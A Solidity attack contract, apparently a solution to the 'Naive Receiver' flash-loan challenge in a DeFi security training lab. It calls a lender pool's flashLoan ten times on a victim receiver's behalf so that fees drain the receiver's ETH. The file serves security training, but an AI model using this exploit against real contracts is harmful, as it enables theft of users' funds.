pragma solidity 0.8.19;

import "forge-std/console.sol";

interface LenderPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);

    function ETH() external returns (address);
}
contract NaiveReceiverAttack {

    function attack(address receiverAddress, address lendingPoolAddress) public {
        // Loop 10 times
            // 1) Make a flashloan to receiver 
            // 2) force fee to be paid
            // 3) repeat
        LenderPool lenderPool = LenderPool(lendingPoolAddress);
        
        uint endIndex = 10;

        for(uint i = 0; i < endIndex; i++) {
            console.log("Receiver starts with %d eth", receiverAddress.balance / 1 ether);
            lenderPool.flashLoan(receiverAddress,lenderPool.ETH(),0.5 ether,"0x");
            console.log("Receiver ends with %d eth", receiverAddress.balance / 1 ether);
        }
    }
}